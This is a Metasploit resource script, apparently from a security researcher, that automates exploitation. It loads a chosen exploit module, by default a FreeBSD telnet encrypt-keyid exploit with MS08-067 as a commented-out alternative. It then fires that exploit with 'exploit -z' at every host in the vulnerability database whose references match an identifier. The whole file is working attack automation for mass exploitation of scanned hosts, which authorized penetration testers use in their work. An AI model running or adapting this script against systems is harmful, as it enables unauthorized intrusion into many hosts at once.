# easy-autoexploiter-template.rc
# Author: m-1-k-3 (Web: http://www.s3cur1ty.de / Twitter: @s3cur1ty_de)


<ruby>
if (ARGV.shift =~ /help/)
	print_status("")
	print_status("Infos:")
	print_status("	This Metasploit RC-File could be used as a template to automate the exploitation process.")
	print_status("	It is just a short example and it should be modified to fit your needs.")
	print_status("	Before we start we need the vulnerability database with all the vulnerability references")
	print_status("	for this process. Import some vulnerability scanner results or use the metasploit scanners for this ...")
	print_status("")
	print_status("possible datastore options:")
	print_status("	MODULE 		- the exploit to use")
	print_status("	IDENTIFIER 	- the identifier for which the resources of the exploits are analyzed")
	print_status("	VERBOSE 	- more details")
	print_status("")
	return
end

if framework.datastore['MODULE']
        exploit = framework.datastore['MODULE']
else
	# the exploit that should be used automatically - check this:
	exploit = "freebsd/telnet/telnet_encrypt_keyid"
end

# alternative MS08-067 configuration
#exploit = "windows/smb/ms08_067_netapi"
#identifier = "MSFT-MS08-067"

if framework.datastore['IDENTIFIER']
	identifier = framework.datastore['IDENTIFIER']
else
	# the string within the references which we are going to search - check this:
	identifier = "BID-51182"
end

#
# Return true if the exploit exists in the framework
#
def exploit_exists?(path)
	# The fetch function returns a Class.
	# If not found, we get a KeyError.
	m = framework.exploits.fetch(path) rescue false
	return (m != false)
end

if not exploit_exists?(exploit)
	print_error("Module not found: #{exploit}")
	return
end



# Test and see if we have a database connected
begin
	framework.db.hosts
rescue ::ActiveRecord::ConnectionNotEstablished
	print_error("Database connection isn't established")
	return
end

run_single("use #{exploit}")
framework.db.workspace.vulns.each do |vuln|
	next if (vuln.refs.to_s !~ /#{identifier}/)
	run_single("set RHOST #{vuln.host.address.to_s}")
	print_status("Running #{active_module.fullname} against host #{vuln.host.address.to_s}")
	run_single("exploit -z")
	sleep 1
end
run_single("back")
</ruby>

